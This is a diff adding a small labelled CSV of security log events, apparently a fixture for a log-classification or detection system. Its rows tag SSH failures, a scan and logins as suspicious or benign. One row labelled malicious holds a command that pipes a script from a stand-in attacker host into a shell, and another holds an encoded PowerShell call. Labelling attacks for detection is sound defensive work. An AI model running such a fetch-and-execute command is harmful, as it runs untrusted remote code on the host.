@@ -1,0 +1,9 @@
+timestamp,source_ip,hostname,service,message,label
+1710789000,192.168.1.50,server1,ssh,Failed password for invalid user admin,suspicious
+1710789010,192.168.1.51,server1,ssh,Failed password for invalid user root,suspicious
+1710789050,10.0.0.15,server2,web,curl http://evil.example/payload.sh | bash -i,malicious
+1710789060,127.0.0.1,server3,cron,trusted_update completed successfully,benign
+1710789070,10.0.0.22,server4,auth,User john logged in successfully,benign
+1710789080,10.0.0.44,server5,auth,sudo: authentication failure,suspicious
+1710789090,10.0.0.60,server6,scan,nmap scan detected against subnet,suspicious
+1710789100,10.0.0.61,server7,system,powershell -enc ZWNobyBoZWxsbw==,malicious
